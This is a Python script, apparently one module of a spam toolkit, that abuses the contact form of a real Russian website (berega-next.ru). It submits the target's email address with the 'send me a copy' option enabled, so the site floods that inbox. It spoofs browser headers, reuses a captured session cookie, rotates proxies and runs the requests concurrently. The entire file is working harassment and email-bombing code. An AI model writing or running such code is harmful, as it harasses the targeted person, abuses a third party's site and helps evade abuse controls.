from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def check_success(self, response: requests.Response | None) -> bool:
        return response.status_code < 400 if response is not None else False

    def post(self, target) -> requests.Response | None:
        cookies = {
            'PHPSESSID': '8ad69f42354641d7dc6fa76ae5f2f624',
            '_ym_uid': '1678181876292841882',
            '_ym_d': '1678181876',
            '_ym_isad': '2',
            '_ym_visorc': 'w',
        }

        headers = {
            'authority': 'berega-next.ru',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'PHPSESSID=8ad69f42354641d7dc6fa76ae5f2f624; _ym_uid=1678181876292841882; _ym_d=1678181876; _ym_isad=2; _ym_visorc=w',
            'origin': 'https://berega-next.ru',
            'pragma': 'no-cache',
            'referer': 'https://berega-next.ru/contact',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'subjtosupport': 'test',
            'texttosupport': self.get_text(),
            'name': 'тест',
            'mail': target,
            'copy': 'on',
        }

        response = requests.post('https://berega-next.ru/contact', cookies=cookies, headers=headers, data=data,
                                 proxies=self.get_proxies(), timeout=20)
        return response


def main():
    s = 'Ваше сообщение отправлено'

    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
